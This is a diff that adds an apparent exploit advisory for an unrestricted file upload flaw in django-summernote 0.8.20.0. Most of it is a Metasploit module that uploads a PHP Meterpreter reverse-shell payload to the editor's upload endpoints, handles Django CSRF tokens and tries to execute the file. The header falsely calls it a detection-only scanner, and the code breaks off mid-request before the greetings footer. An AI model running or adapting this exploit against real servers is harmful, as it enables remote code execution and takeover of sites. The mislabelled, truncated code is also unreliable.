@@ -1,0 +1,152 @@
+=============================================================================================================================================
+| # Title     : Django Summernote 0.8.20.0 Unrestricted File Upload Scanner (Auxiliary)                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://djangopackages.org/packages/p/django-summernote/                                                                    |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/214231/
+
+[+] Summary    :  This Metasploit Auxiliary Scanner module detects unrestricted file upload vulnerabilities in django-summernote. 
+                  It targets misconfigurations where image validation depends on the Pillow library and allows non-image files to be uploaded when Pillow is missing. 
+                  The module safely scans common upload endpoints, handles CSRF protection, and confirms vulnerability by observing successful JSON responses containing uploaded file URLs. 
+                  It performs detection only, does not execute payloads, and is designed for safe, non-intrusive security assessment.
+
+[+] Usage : 
+
+
+use exploit/unix/http/django_summernote_rce
+set RHOSTS 192.168.1.100
+set RPORT 80
+set TARGETURI /
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST [Your_IP]
+set LPORT 4444
+
+check
+
+exploit
+
+[+] POC :
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => 'Django Summernote Unrestricted File Upload RCE',
+        'Description'    => %q{
+          This module exploits an unrestricted file upload vulnerability in django-summernote <= 0.8.20.0.
+          The vulnerability occurs when the 'Pillow' library is missing from the server environment,
+          forcing the application to use a 'FileField' instead of an 'ImageField'. 
+          This allows an attacker to upload arbitrary files (such as PHP shells).
+          If the media directory is misconfigured to allow script execution, Remote Code Execution (RCE) is possible.
+        },
+        'Author'         => [ 'indoushka' ],
+        'License'        => MSF_LICENSE,
+        'Platform'       => 'php',
+        'Arch'           => ARCH_PHP,
+        'Targets'        => [
+          ['PHP Payload (Generic)', { 'Platform' => 'php', 'Arch' => ARCH_PHP }]
+        ],
+        'DefaultTarget'  => 0,
+        'DisclosureDate' => '2026-01-24',
+        'References'     => [
+          ['URL', 'https://github.com/summernote/django-summernote']
+        ],
+        'Notes'          => {
+          'Stability'   => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'The base path to the Django application', '/'])
+    ])
+  end
+
+  def check
+    upload_paths = [
+      '/summernote/upload_editor_file/',
+      '/summernote/upload_attachment/',
+      '/admin/summernote/upload_editor_file/'
+    ]
+
+    upload_paths.each do |path|
+      full_path = normalize_uri(target_uri.path, path)
+      res = send_request_cgi('method' => 'GET', 'uri' => full_path)
+
+      if res && (res.code == 405 || (res.code == 200 && res.body.include?('upload_editor_file')))
+        return Exploit::CheckCode::Appears
+      end
+    end
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    upload_paths = [
+      '/summernote/upload_editor_file/',
+      '/summernote/upload_attachment/',
+      '/admin/summernote/upload_editor_file/'
+    ]
+
+    upload_paths.each do |path|
+      full_path = normalize_uri(target_uri.path, path)
+      print_status("Checking endpoint: #{full_path}")
+
+      res = send_request_cgi('method' => 'GET', 'uri' => full_path)
+      next unless res
+
+      cookies = res.get_cookies
+      csrf_token = res.get_cookies_parsed['csrftoken']&.first
+
+      filename = "#{Rex::Text.rand_text_alpha(8)}.php"
+      data = Rex::MIME::Message.new
+      
+      if csrf_token
+        data.add_part(csrf_token, nil, nil, 'form-data; name="csrfmiddlewaretoken"')
+      end
+
+      data.add_part(payload.encoded, 'application/x-php', nil, "form-data; name=\"files\"; filename=\"#{filename}\"")
+
+      print_status("Attempting to upload payload: #{filename}")
+
+      res = send_request_cgi({
+        'method'  => 'POST',
+        'uri'     => full_path,
+        'ctype'   => "multipart/form-data; boundary=#{data.bound}",
+        'cookie'  => cookies,
+        'headers' => { 'Referer' => full_path }, # Referer is often required for Django CSRF
+        'data'    => data.to_s
+      })
+
+      if res && res.code == 200 && res.headers['Content-Type']&.include?('application/json')
+        begin
+          json_res = res.get_json_document
+
+          file_url = json_res['files'] ? json_res['files'][0]['url'] : json_res['url']
+
+          if file_url
+            print_good("Payload uploaded successfully: #{file_url}")
+
+            register_file_for_cleanup(File.basename(file_url))
+
+            print_status("Executing payload via GET request...")
+            send_request_cgi({
+			
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
